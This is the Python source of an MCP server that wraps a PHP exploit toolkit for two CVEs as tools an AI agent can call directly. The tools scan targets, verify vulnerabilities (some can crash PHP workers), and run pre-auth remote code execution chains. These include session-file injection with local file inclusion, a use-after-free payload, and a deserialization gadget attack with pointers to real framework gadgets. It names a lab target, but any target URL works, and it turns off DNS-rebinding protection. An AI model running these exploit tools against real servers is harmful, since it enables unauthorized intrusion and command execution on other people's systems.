#!/usr/bin/env python3
"""
php2shell MCP Server — CVE-2026-109618 / CVE-2026-109619 exploit toolkit
=============================================================================
Wraps the official php2shell-poc tools (https://github.com/ikow/php2shell-poc, MIT)
as MCP tools for Tiel to call directly via mcp__php2shell__*.

Tools exposed:
  scan_vulnerability      — 4-tier scanner (passive; active=True adds OOM probe)
  verify_session_injection — Verify Chain A primitive (session fixation + filename injection)
  verify_handler_mismatch  — Verify Chain C condition (FPM handler mismatch)
  verify_oom_trigger       — Verify Chain D condition (OOM amplification, mod_php only)
  make_huge_session        — Create ~30MB session needed for Chain E verification
  verify_fpm_stale_state   — Verify Chain E condition (FPM stale BG)
  chain_a_session_lfi      — [RCE] Chain A: session injection + LFI (pre-auth, needs LFI endpoint)
  chain_b_get_payload      — [RCE] Chain B: return var_destroy UAF PHP (must exec ON target)
  chain_c_mismatch_rce     — [RCE] Chain C: handler mismatch → __destruct (FPM, needs POP gadget)

Default target from inside container: http://host.docker.internal:18056
env: MCP_HOST, MCP_PORT, PHP2SHELL_TARGET
"""
import os
import subprocess
import sys
from pathlib import Path

from mcp.server.fastmcp import FastMCP

BASE = Path(__file__).parent / "php2shell-poc"
EXPLOIT_DIR = BASE / "exploit"
POC_DIR = BASE / "poc"
SCANNER_DIR = BASE / "scanner"

DEFAULT_TARGET = os.environ.get("PHP2SHELL_TARGET", "http://host.docker.internal:18056")
PY = sys.executable
PHP = "php"

mcp = FastMCP(
    "php2shell",
    instructions=(
        "php2shell toolkit (CVE-2026-109618/CVE-2026-109619). "
        "Authorized lab target default: http://host.docker.internal:18056. "
        "Chains: A (pre-auth LFI RCE), B (UAF, needs local PHP exec on target), "
        "C (FPM handler mismatch RCE, needs POP gadget), "
        "D (mod_php OOM — verify only, N/A on FPM), "
        "E (FPM stale BG — verify only, full exploit not public). "
        "Always confirm authorization before running active/exploit tools."
    ),
)


def _run(*args, timeout: int = 60) -> str:
    try:
        result = subprocess.run(
            list(args), capture_output=True, text=True, timeout=timeout,
        )
        out = result.stdout
        if result.stderr:
            out += "\n--- stderr ---\n" + result.stderr
        if result.returncode != 0:
            out += f"\n--- exit code: {result.returncode} ---"
        return out.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"TIMEOUT: command did not complete within {timeout}s"
    except FileNotFoundError as e:
        return f"COMMAND NOT FOUND: {e}"


# ── Scanner ──────────────────────────────────────────────────────────────────

@mcp.tool()
def scan_vulnerability(
    target: str = DEFAULT_TARGET,
    path: str = "/",
    active: bool = False,
    output_json: bool = False,
) -> str:
    """
    4-tier php2shell vulnerability scanner (CVE-2026-109618/CVE-2026-109619).

    Tier 1: version fingerprint (passive, from headers).
    Tier 2: upload_progress reachability + session fixation check.
    Tier 3: session write injection marker (non-destructive).
    Tier 4: OOM differential (only when active=True — MAY CRASH PHP WORKERS).

    Returns: verdict (VULNERABLE/LIKELY_VULNERABLE/PATCHED/UNKNOWN), applicable chains,
    PHP version, SAPI, and recommendations.
    output_json=True returns machine-readable JSON.
    """
    args = [PY, str(SCANNER_DIR / "check.py"), target, "--path", path]
    if active:
        args.append("--active")
    if output_json:
        args.append("--json")
    return _run(*args, timeout=30)


# ── Verification PoCs ────────────────────────────────────────────────────────

@mcp.tool()
def verify_session_injection(
    target: str = DEFAULT_TARGET,
    path: str = "/index.php",
    sid: str = "verifysession00000000000000",
) -> str:
    """
    Verify Chain A/B prerequisite: session fixation + raw filename injection.

    Sends 3 non-destructive uploads: normal filename, PHP code in filename,
    pipe+serialized object in filename. Confirms that upload_progress stores
    filenames raw in the session file (the injection primitive for all session chains).

    Does NOT confirm RCE — only the primitive.
    Check /tmp/sessions/sess_<sid> on the target to inspect session file contents.
    """
    return _run(
        PY, str(POC_DIR / "verify_session_injection.py"),
        "--target", target,
        "--path", path,
        "--sid", sid,
        timeout=30,
    )


@mcp.tool()
def verify_handler_mismatch(
    target: str = DEFAULT_TARGET,
    write_path: str = "/app/upload.php",
    read_path: str = "/api/endpoint.php",
    sid: str = "mismatchverify0000000000000",
) -> str:
    """
    Verify Chain C prerequisite: session handler mismatch (FPM only).

    Writes session via php_serialize endpoint, reads via php endpoint.
    Confirmed vulnerable if response contains 'Failed to decode session object'.
    Requires the target to have two directories with different session.serialize_handler:
    - write_path: endpoint under dir with .user.ini: serialize_handler=php_serialize
    - read_path:  endpoint under dir with .user.ini: serialize_handler=php
    """
    return _run(
        PY, str(POC_DIR / "verify_handler_mismatch.py"),
        "--target", target,
        "--write-path", write_path,
        "--read-path", read_path,
        "--sid", sid,
        timeout=30,
    )


@mcp.tool()
def verify_oom_trigger(
    host: str = "host.docker.internal",
    port: int = 18056,
    path: str = "/index.php",
    strategy: str = "headers",
    num_headers: int = 5000,
) -> str:
    """
    Verify Chain D condition: OOM amplification via multipart (mod_php only).

    Sends an oversized multipart request to trigger PHP memory_limit.
    Chain D (stale EG() RCE) only affects Apache mod_php — on FPM targets
    this will show 502 (worker crash) not the EG corruption needed for D.
    ⚠️ May crash PHP workers.

    strategy: 'headers' (many headers per part), 'nested' (deep array names), 'no_length'.
    On our lab target (FPM at :18056), expect 502 not RCE from Chain D.
    """
    return _run(
        PY, str(POC_DIR / "verify_oom_trigger.py"),
        "--host", host,
        "--port", str(port),
        "--path", path,
        "--strategy", strategy,
        "--num-headers", str(num_headers),
        timeout=60,
    )


@mcp.tool()
def make_huge_session(
    target: str = DEFAULT_TARGET,
    sid: str = "hugesession000000000000000",
    size_mb: int = 30,
    container: str = "php2shell-fpm-56",
) -> str:
    """
    Create ~30MB session file on the target FPM container for Chain E verification.

    Must run BEFORE verify_fpm_stale_state. Uses docker exec to write into the
    FPM container's /tmp/sessions/ directory. File is one-shot (truncated to 0
    after the producer OOM — recreate before each run).

    container: FPM Docker container name (port 18056 → 'php2shell-fpm-56',
               port 18080 → 'php2shell-fpm-80', etc.).
    Requires: docker CLI available in this container (bind-mount /var/run/docker.sock).
    """
    return _run(
        PY, str(POC_DIR / "make_huge_session.py"),
        "--target", target,
        "--sid", sid,
        "--size-mb", str(size_mb),
        "--container", container,
        timeout=120,
    )


@mcp.tool()
def verify_fpm_stale_state(
    target: str = DEFAULT_TARGET,
    session_path: str = "/session_oom.php",
    upload_path: str = "/index.php",
    producer_sid: str = "hugesession000000000000000",
    consumer_sid: str = "consumerpoisoned0000000000",
) -> str:
    """
    Verify Chain E condition: FPM session OOM → stale BG(unserialize) → UAF.

    REQUIRES: run make_huge_session first to create the ~30MB session file.
    REQUIRES: pm=static, pm.max_children=1 (same worker guaranteed), memory_limit≤32M.

    Producer: loads huge session via session_path → OOM → BG(unserialize) left dirty.
    Consumer: upload_progress to same worker → rfc1867 reads stale state.
    Vulnerable: 'Session object destruction failed' or 502 in consumer response.

    NOTE: Full Chain E RCE exploit is not public (paid). This verifies the condition only.
    """
    return _run(
        PY, str(POC_DIR / "verify_fpm_stale_state.py"),
        "--target", target,
        "--session-path", session_path,
        "--upload-path", upload_path,
        "--producer-sid", producer_sid,
        "--consumer-sid", consumer_sid,
        timeout=120,
    )


# ── Exploit chains ───────────────────────────────────────────────────────────

@mcp.tool()
def chain_a_session_lfi(
    target: str = DEFAULT_TARGET,
    inject_path: str = "/index.php",
    lfi_path: str = "/vuln.php",
    session_path: str = "/tmp/sessions",
    command: str = "id",
    cleanup_on: bool = False,
    attempts: int = 3,
) -> str:
    """
    [RCE EXPLOIT] Chain A: session injection + LFI → pre-auth RCE.

    Injects PHP payload via upload_progress filename into session file,
    then triggers LFI to include the session file → executes the PHP → RCE.

    Requires:
    - session.upload_progress.enabled=On (PHP default)
    - An LFI sink: endpoint with ?page=<path> or include($GET['page']) (set lfi_path)
    - Known session save_path (session_path; try /tmp/sessions, /tmp, /var/lib/php/sessions)

    cleanup_on=True: races session.upload_progress.cleanup=On with a stalled writer.
    RCE confirmed when output contains ___START___<cmd output>___END___.
    """
    args = [
        PY, str(EXPLOIT_DIR / "chain_a_session_lfi.py"),
        "--target", target,
        "--inject-path", inject_path,
        "--lfi-path", lfi_path,
        "--session-path", session_path,
        "--command", command,
        "--attempts", str(attempts),
    ]
    if cleanup_on:
        args.append("--cleanup-on")
    return _run(*args, timeout=90)


@mcp.tool()
def chain_b_get_payload() -> str:
    """
    [RCE EXPLOIT] Chain B: var_destroy UAF → function handler overwrite → RCE.

    Returns the PHP exploit code (chain_b_uaf_rce.php) that must be EXECUTED ON the
    target PHP server. This is NOT a remote network exploit — it requires running
    PHP locally inside the target process with /proc/self/mem write access
    (typically inside the PHP-FPM container, requires CAP_SYS_PTRACE or root).

    Workflow: obtain initial code execution via Chain A or C → upload/inject this PHP →
    execute it → UAF overwrites var_dump handler with system() pointer → RCE.

    ⚠️ EG offset 0x1420900 is calibrated for php:8.2.34-fpm ONLY.
    Other versions (8.2.35+, 8.3.x, 8.4.x) need offset recalibration.
    Returns the PHP source code.
    """
    try:
        return (EXPLOIT_DIR / "chain_b_uaf_rce.php").read_text()
    except Exception as e:
        return f"Error reading payload: {e}"


@mcp.tool()
def chain_c_mismatch_rce(
    target: str = DEFAULT_TARGET,
    pollute_path: str = "/app_serialize.php",
    upload_path: str = "/app/upload.php",
    trigger_path: str = "/api/endpoint.php",
    command: str = "id > /tmp/rce_proof.txt 2>&1",
    gadget: str = "",
    pollute_attempts: int = 10,
    inject_attempts: int = 20,
) -> str:
    """
    [RCE EXPLOIT] Chain C: handler mismatch → __destruct → RCE (FPM, pre-auth).

    Step 1: Pollute FPM worker via pollute_path (endpoint calling ini_set('php_serialize')).
    Step 2: Inject gadget object via upload filename in php_serialize format.
    Step 3: Trigger: trigger_path reads session with php handler → deserializes → __destruct fires.

    Requires:
    - PHP-FPM (persistent workers)
    - pollute_path: endpoint calling ini_set('session.serialize_handler', 'php_serialize')
      (Laravel, Symfony do this by default)
    - A PHP class with exploitable __destruct() autoloaded at trigger_path

    gadget: custom serialized object for the target (leave blank for lab 'Evil' class).
    Real frameworks: Laravel PendingBroadcast, Symfony TagAwareAdapter, etc.
    Check /tmp/rce_proof.txt on target after running.
    """
    args = [
        PY, str(EXPLOIT_DIR / "chain_c_mismatch_rce.py"),
        "--target", target,
        "--pollute-path", pollute_path,
        "--upload-path", upload_path,
        "--trigger-path", trigger_path,
        "--command", command,
        "--pollute-attempts", str(pollute_attempts),
        "--inject-attempts", str(inject_attempts),
    ]
    if gadget:
        args.extend(["--gadget", gadget])
    return _run(*args, timeout=120)


# ── Server startup ────────────────────────────────────────────────────────────

def main():
    host = os.environ.get("MCP_HOST", "0.0.0.0")
    port = int(os.environ.get("MCP_PORT", "8008"))

    try:
        mcp.settings.host = host
        mcp.settings.port = port
    except Exception:
        os.environ.setdefault("FASTMCP_HOST", host)
        os.environ.setdefault("FASTMCP_PORT", str(port))

    try:
        from mcp.server.transport_security import TransportSecuritySettings
        mcp.settings.transport_security = TransportSecuritySettings(
            enable_dns_rebinding_protection=False)
    except Exception as e:
        print(f"[php2shell-mcp] WARN: could not set transport_security ({e})",
              file=sys.stderr)

    print(f"[php2shell-mcp] serving at http://{host}:{port}/mcp "
          f"— default target={DEFAULT_TARGET}", file=sys.stderr)
    mcp.run(transport="streamable-http")


if __name__ == "__main__":
    main()
